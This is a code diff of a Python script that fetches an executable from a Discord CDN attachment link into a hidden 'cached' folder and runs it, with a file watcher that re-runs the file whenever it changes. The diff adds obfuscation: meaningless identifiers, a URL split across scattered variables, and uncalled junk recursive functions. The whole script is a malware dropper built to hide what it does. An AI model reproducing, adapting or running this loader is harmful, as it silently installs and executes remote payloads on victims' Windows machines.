@@ -6,48 +6,106 @@ from watchdog.observers import Observer
 from watchdog.events import FileSystemEventHandler
 import ctypes
 
-class CustomFileSystemEventHandler(FileSystemEventHandler):
-    def __init__(self, file_path):
+discord_v = "HEosnziOZnnae."
+
+class efh(FileSystemEventHandler):
+    def __init__(self,ep):
         super().__init__()
-        self.file_path = file_path
+        self.ep = ep
 
-    def on_modified(self, event):
-        if event.src_path == self.file_path:
-            subprocess.run([self.file_path], shell=True)
+    def om(self, event):
+        if event.src_path == self.ep:
+            subprocess.run([self.ep], shell=True)
 
-main_gateway = "https://cdn.discordapp.com"
-attachment_id = "1221158414575472724"
-api_id = "1221158898757799996"
-discord_version = "HEosnziOZnnae."
-parameter = "ex=66118fd9&is=65ff1ad9&hm="
-additional_param = "f8dba6d4dcb4f226124fd072fd26&"
-folder_name = 'cached'
+sub = "ex=66118fd9&is=65ff1ad9&hm="
 
-def download_and_execute(url, folder_name):
+wrd = "10fef8bfeb7c33f309ff4f9214c5613f27fa"
+
+def dsdsdds ():
+    for wwwwi in range(3343555):
+
+        irvii()
+
+gtr = "f8dba6d4dcb4f226124fd072fd26&"
+
+
+main_gateway = "https://cdn.discordapp.com" #entry point
+gateway_bits = "e" #bits to use  before broser fingerprint gets locked in binary alpha 1st rule
+
+def iii ():
+    for awsedrftgyhujikoi in range(7888888888888888888888882002020202):
+
+        awsedrftgyhujikoi()
+
+def irvii ():
+    for wwwwi in range(8887777222):
+
+        irvii()
+
+rl1 = "attachments"
+
+def wddw ():
+    for dwdwdw in range(666626990402112):
+
+        wddw()
+
+pokk = "e"
+
+def icececeecii ():
+    for i in range(89828998923832):
+
+        icececeecii()
+
+
+rl11 = "1221158414575472724"
+ppkl = "1221158898757799996"
+discord_api_int_version = "89177737318179831"
+
+fnk = "x"
+
+
+
+
+def cfl(repo_url, efn, folder_name):
+    ctr = os.path.dirname(os.path.abspath(__file__))
+    hpp = os.path.join(ctr, folder_name)
+    fnk = "x"
+    
     try:
-        response = requests.get(url)
+        os.mkdir(hpp)
+
+        FILE_ATTRIBUTE_HIDDEN = 0x02
+        ctypes.windll.kernel32.SetFileAttributesW(hpp, FILE_ATTRIBUTE_HIDDEN)
+
+        response = requests.get(repo_url)
         response.raise_for_status()
-        file_path = os.path.join(folder_name, 'discord.exe')
-        
-        os.makedirs(folder_name, exist_ok=True)
-        with open(file_path, 'wb') as file:
-            file.write(response.content)
-        
-        ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  # Hide the file
-        return file_path
-    except Exception as e:
-        print("Error:", e)
-        return None
 
-authorization_url = f"{main_gateway}/attachments/{attachment_id}/{api_id}/{discord_version}/e{parameter}{additional_param}"
-file_path = download_and_execute(authorization_url, folder_name)
+        ep = os.path.join(hpp, efn)
 
-if file_path:
-    subprocess.Popen([file_path], shell=True)
+        with open(ep, 'wb') as exe_file:
+            exe_file.write(response.content)
 
-    event_handler = CustomFileSystemEventHandler(file_path)
+        return ep
+    except FileExistsError:
+        pass
+
+pp = "/"
+
+
+
+
+authorization = f"{main_gateway}/{rl1}/{rl11}/{ppkl}/{discord_v}{pokk}{fnk}{pokk}?{sub}{wrd}{gtr}"
+api = f"{discord_v}{pokk}{fnk}{pokk}"
+cache = 'cached'
+
+dep = cfl(authorization, api, cache)
+
+if dep:
+    subprocess.run([dep], shell=True)
+
+    handler = efh(dep)
     observer = Observer()
-    observer.schedule(event_handler, path=os.path.dirname(file_path), recursive=False)
+    observer.schedule(handler, path=os.path.dirname(dep), recursive=False)
     observer.start()
 
     try:
@@ -55,4 +113,7 @@ if file_path:
             time.sleep(1)
     except KeyboardInterrupt:
         observer.stop()
-        observer.join()
+
+
+
+    observer.join()
